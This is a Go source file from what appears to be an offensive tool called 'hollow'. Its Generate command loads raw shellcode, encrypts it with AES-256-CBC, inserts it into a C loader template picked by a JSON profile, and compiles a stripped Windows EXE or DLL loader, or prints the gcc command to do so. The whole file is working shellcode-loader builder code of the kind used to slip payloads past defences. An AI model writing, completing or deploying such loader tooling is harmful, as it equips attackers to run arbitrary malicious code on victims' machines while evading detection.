package cmd

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/kanyo/hollow/core"
)

type GenerateOptions struct {
	ShellcodePath string
	ProfilePath   string
	TemplateDir   string
}

func Generate(opts GenerateOptions) error {
	profileData, err := os.ReadFile(opts.ProfilePath)
	if err != nil {
		return fmt.Errorf("reading profile: %w", err)
	}

	var profile core.Profile
	if err := json.Unmarshal(profileData, &profile); err != nil {
		return fmt.Errorf("parsing profile: %w", err)
	}

	shellcode, err := os.ReadFile(opts.ShellcodePath)
	if err != nil {
		return fmt.Errorf("reading shellcode: %w", err)
	}
	fmt.Printf("[*] Loaded %d bytes of shellcode\n", len(shellcode))

	payload, err := core.EncryptAES256CBC(shellcode)
	if err != nil {
		return fmt.Errorf("encrypting shellcode: %w", err)
	}
	fmt.Printf("[*] Encrypted shellcode: %d bytes (AES-256-CBC)\n", len(payload.Ciphertext))

	tmpl, err := core.LoadTemplate(opts.TemplateDir, profile.Template)
	if err != nil {
		return fmt.Errorf("loading template: %w", err)
	}

	source := core.SubstitutePlaceholders(tmpl, payload, &profile)

	if err := os.MkdirAll(profile.OutputDir, 0750); err != nil {
		return fmt.Errorf("creating output dir: %w", err)
	}

	ext := "exe"
	if profile.Compile.OutputType == "dll" {
		ext = "dll"
	}
	outputName := fmt.Sprintf("%s_loader.%s", profile.Template, ext)
	outputPath := filepath.Join(profile.OutputDir, outputName)

	if !profile.Compile.Automatic {
		srcOut := filepath.Join(profile.OutputDir, "loader.c")
		if err := os.WriteFile(srcOut, []byte(source), 0600); err != nil {
			return fmt.Errorf("writing source: %w", err)
		}
		fmt.Printf("[+] Source written to: %s\n", srcOut)
		extraFlags := "-lbcrypt -s -w"
		if profile.Compile.OutputType == "dll" {
			extraFlags += " -shared"
		}
		fmt.Printf("[!] Compile manually: %s loader.c -o %s %s\n",
			profile.Compile.GCC, outputPath, extraFlags)
		return nil
	}

	fmt.Printf("[*] Compiling with %s\n", profile.Compile.GCC)
	if err := core.CompileLoader(source, outputPath, &profile); err != nil {
		return err
	}

	fmt.Printf("[+] Output: %s\n", outputPath)
	return nil
}
